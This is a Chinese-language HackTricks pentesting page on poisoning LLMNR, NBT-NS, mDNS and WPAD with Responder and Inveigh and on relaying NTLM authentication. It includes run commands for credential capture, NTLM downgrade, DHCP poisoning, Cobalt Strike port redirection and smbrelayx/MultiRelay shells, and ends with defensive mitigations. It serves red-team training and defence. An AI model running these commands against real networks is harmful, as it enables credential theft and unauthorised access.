# 伪造 LLMNR、NBT-NS、mDNS/DNS 和 WPAD 以及中继攻击

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

- 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
- 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) 上**关注**我们。
- 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 网络协议

### LLMNR、NBT-NS 和 mDNS

Microsoft 系统在 DNS 查询失败时使用链路本地多播名称解析（LLMNR）和 NetBIOS 名称服务（NBT-NS）进行本地主机解析。Apple Bonjour 和 Linux 零配置实现使用多播 DNS（mDNS）来发现网络内的系统。这些协议未经身份验证，通过 UDP 广播消息；因此，攻击者可以利用它们将用户引导到恶意服务。

您可以使用 Responder 模拟被主机搜索的服务，发送虚假响应。\
阅读更多关于[如何使用 Responder 模拟服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的信息。

### WPAD

许多浏览器使用 Web 代理自动发现（WPAD）从网络加载代理设置。WPAD 服务器通过特定 URL（例如，_http://wpad.example.org/wpad.dat_）提供客户端代理设置，当通过以下任一方式识别时：

- DHCP，使用代码 252 条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
- DNS，在本地域中搜索 _wpad_ 主机名
- Microsoft LLMNR 和 NBT-NS（在 DNS 查询失败时）

Responder 自动化了 WPAD 攻击 — 运行代理并通过 DHCP、DNS、LLMNR 和 NBT-NS 将客户端引导到恶意 WPAD 服务器。

## 协议中毒

### Responder - LLMNR、NBT-NS 和 MDNS

> Responder 是一个 LLMNR、NBT-NS 和 MDNS 毒化工具。它将根据其名称后缀回答 _特定_ NBT-NS（NetBIOS 名称服务）查询（参见：[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)）。默认情况下，该工具仅会回答用于 SMB 的文件服务器服务请求。
>
> 这背后的概念是针对我们的答案，并在网络上更隐蔽。这也有助于确保我们不会破坏合法的 NBT-NS 行为。

- [**Responder**](https://github.com/lgandx/Responder) 默认安装在 kali 中，配置文件位于 \*\*`/etc/responder/Responder.conf` \*\*（您可以在此处禁用恶意服务器）
- **Responder** 将在屏幕上**打印哈希值**并将其写入位于 `/usr/share/responder/logs` 目录中每个主机的**日志**文件中。哈希值以 `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt` 格式保存
- 您可以在此处找到**windows** 版本的 Responder [here](https://github.com/lgandx/Responder-Windows)
- Responder 支持 **ipv4** 和 **ipv6**

#### Responder 参数

Responder 支持以下选项：
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder 参数</summary>

* `-A` 标志将我们置于**分析模式**，允许我们在环境中查看 NBT-NS、BROWSER 和 LLMNR 请求，而不会对任何响应进行毒化。
* 我们必须始终提供接口或 IP。
* `-wf` 将启动 WPAD 恶意代理服务器。
* `-f` 将尝试对远程主机的操作系统和版本进行指纹识别。
* 使用 `-v` 标志可增加详细程度（将大量附加数据打印到控制台）。
* 诸如 `-F` 和 `-P` 的选项可用于强制 NTLM 或基本身份验证和强制代理身份验证，但可能会导致登录提示，因此应谨慎使用。
* `-w` 标志利用内置的 WPAD 代理服务器。这可能非常有效，特别是在大型组织中，因为它将捕获所有启动 Internet Explorer 的用户发出的所有 HTTP 请求，如果浏览器启用了[自动检测设置](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)。

</details>

#### 运行 Responder

要运行默认的 Responder 行为，您只需执行：
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
一个有趣的技巧是使用 responder 在可能的情况下降级 NTLM 认证。这将允许**捕获 NTLMv1 挑战和响应**，而不是可以**轻松破解**的 NTLMv2 [**按照这个指南**](../../windows-hardening/ntlm/#ntlmv1-attack)**。**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
默认情况下，WPAD冒充不会被执行，但您可以执行以下操作：
```bash
responder -I <Iface> --wpad
```
您还可以使用**您的IP**解析NetBIOS请求。并创建一个**身份验证代理**：
```bash
responder.py -I <interface> -Pv
```
无法拦截NTLM哈希（通常情况下），但可以轻松获取一些**NTLM挑战和响应**，然后可以使用例如_**john**_选项`--format=netntlmv2`来**破解**。

默认的_**Responder**_安装在kali中的**日志和挑战**可以在`/usr/share/responder/logs`中找到。

#### Responder - DHCP中毒

Windows使用几个自定义的DHCP选项，如NetBIOS、WINS、WPAD设置。当工作站发送DHCP请求以获取其网络设置时，这些附加设置可以包含在DHCP答复中，以促进直接的连接和名称解析。

欺骗DHCP响应而不造成干扰可能具有挑战性，因为这会干扰工作站的网络配置。通常，您需要对目标子网有很好的了解，DNS服务器在哪里，交换机在哪里，路由表，域，子网掩码，DHCP服务器等。**任何这些设置的错误都会导致网络中断。**

然而，欺骗DHCP答复具有独特的好处。**它绝对比ARP中毒更隐蔽**；一个单播响应就足以永久中毒受害者的路由信息，网络上通常也会看到多个DHCP服务器在运行。单播DHCP答复更难检测，一些交换机提供安全设置以防止DHCP窥探，但是当启用时，这些设置并不直观，通常在配置时会出现错误。

> 这种攻击非常有效，并确保获得NTLMv1/2哈希。
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - 捕获凭证

Responder将**冒充所有使用所述协议的服务**。一旦某个用户尝试访问使用这些协议解析的服务，**他将尝试对抗Responder**，并且Responder将能够**捕获**“凭证”（很可能是**NTLMv2挑战/响应**）：

可以尝试降级到NetNTLMv1或尝试禁用ESS。

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh是一个PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS欺骗器和中间人工具，旨在帮助发现自己受限于Windows系统的渗透测试人员/红队人员。

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)是一个PowerShell脚本，现在是一个具有与Responder相同主要功能的C#二进制文件。有一个[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)列出了所有参数和使用说明。\
另一个版本可以在[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)找到。

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

或者使用更多选项运行它：
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
或者运行C#版本：
```bash
Inveigh.exe
```
## NTLM中继攻击

这种攻击将内部网络上的**SMB认证会话**中继到一个**目标机器**。如果认证**会话成功**，它将自动将您**转到一个系统** **shell**。请注意，中继的认证必须来自一个具有对中继主机的本地管理员访问权限的**用户**，并且**SMB签名必须被禁用**。

### 445端口转发和隧道

{% hint style="warning" %}
如果您可以**引入一个机器到网络内部**，您可以使用以下部分的任何**工具**来执行一个中继攻击，您不需要担心这个。
{% endhint %}

然而，在红队中，情况并非如此，在红队中，通常需要**将Windows机器的端口445的流量转发到您的机器**，执行以下任何工具，然后通过代理**将该工具的流量路由回来**，以达到内部攻击机器的目的。

工具[**PortBender**](https://github.com/praetorian-inc/PortBender)是一个**驱动程序**，用于将目的地为端口**445的流量重定向到另一个端口**（例如8445），**我们可以绑定**。需要**本地管理员**访问权限才能加载驱动程序。在这里使用`cd C:\Windows\System32\drivers`是有道理的，因为大多数Windows驱动程序都在这里。
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

如果要使用**MultiRelay**，请转到_**/usr/share/responder/tools**_并执行MultiRelay (`-t <IP target> -u <User>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### 强制 NTLM 登录

在 Windows 中，您**可能能够强制一些特权帐户对任意机器进行身份验证**。阅读以下页面以了解如何操作：

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## 解决方案

### 禁用 LLMNR

要为 DNS 客户端在您的域中禁用 LLMNR，请打开 gpedit.msc。\
导航至计算机配置->管理模板->网络->DNS 客户端。\
找到选项“关闭多播名称解析”并单击“策略设置”：

![](../../.gitbook/assets/1.jpg)

新窗口打开后，启用此选项，按“应用”然后单击“确定”：

![](../../.gitbook/assets/2.jpg)

### **禁用 NBT-NS**

禁用 NBT-NS 的一种选项是使用 DHCP 范围选项。

如果使用 Microsoft 的 DHCP 服务器，请选择要禁用 NBT-NS 的范围。右键单击“范围选项”，然后单击“配置选项”。在下面的示例中，我要为其禁用 NBT-NS 的 DHCP 范围是 192.168.1.100。

![](../../.gitbook/assets/3.jpg)

在范围选项窗口中，导航到高级选项标签，将下拉窗口更改为“Microsoft Windows 2000 选项”：

![](../../.gitbook/assets/4.jpg)

从列表中选择“001 Microsoft 禁用 Netbios 选项”，将其值更改为“0x2”，单击应用，然后单击确定：

![](../../.gitbook/assets/5.jpg)

### WPAD

为了防范 WPAD 攻击，您可以在 DNS 区域中添加一个“wpad”条目。请注意，DNS 条目不需要指向有效的 WPAD 服务器。只要查询得到解析，攻击就会被阻止。

### 多中继

1\. **强制所有本地 Windows 机器上启用 SMB 签名**。此设置将为每个 SMB 会话进行数字签名，强制客户端和服务器在继续之前验证数据包的来源。此设置仅在域控制器上默认启用。Microsoft 的以下文章详细介绍了这些设置（可通过组策略启用），以及如何实施这些设置。

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **审查并确保本地网络上的用户只能远程登录到必要的机器**。例如：Sally 只能登录到 Sally 的工作站。如果攻击者拦截了 Sally 的 SMB 认证会话，他们无法将会话中继到任何工作站，使此方法无效。

3\. **尽可能限制本地网络上的 NTLM 认证**。此攻击无法利用 Kerberos 认证，因此通过限制 NTLM 的数量，可以大大阻碍此攻击。Microsoft 有关如何实现此操作的信息，但请注意... 如果 Kerberos 认证由于某种原因失败，通常会退回到 NTLM。如果完全禁用它，您的网络可能会陷入停顿。

4\. **防止网络上的未经授权用户**。内部威胁可能不会利用 SMB 中继攻击，因为他们已经拥有网络凭据。通过加强物理安全策略、使用 ACL 和 MAC 过滤器阻止网络上的恶意设备，并确保适当的网络分割，可以大大限制此攻击被执行的威胁。

## 参考资料

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **图片来源：**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家 NFT 的收藏
* **加入** 💬 [**Discord 群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) 上关注我们。
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
